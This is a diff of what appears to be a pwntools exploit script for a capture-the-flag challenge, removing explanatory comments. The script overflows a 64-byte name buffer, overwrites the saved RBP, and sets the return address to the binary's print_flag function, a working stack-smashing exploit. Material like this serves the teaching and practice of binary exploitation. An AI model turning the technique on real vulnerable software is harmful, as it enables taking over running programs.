@@ -7,13 +7,8 @@ r = process([exe.path])
 
 win = exe.symbols["print_flag"]
 
-# Payload construction:
-# 1. Fill the 64-byte name buffer
-# 2. Overwrite saved RBP (8 bytes)
-# 3. Overwrite return address with print_flag address (8 bytes)
-
-payload = b'A' * 64      # Fill the name[64] buffer
-payload += b'B' * 8      # Overwrite saved RBP
+payload = b'A' * 64      # Fill buffer
+payload += b'B' * 8
 payload += p64(win)      # Overwrite return address with print_flag
 
 r.recvuntil(b"What's your name? ")
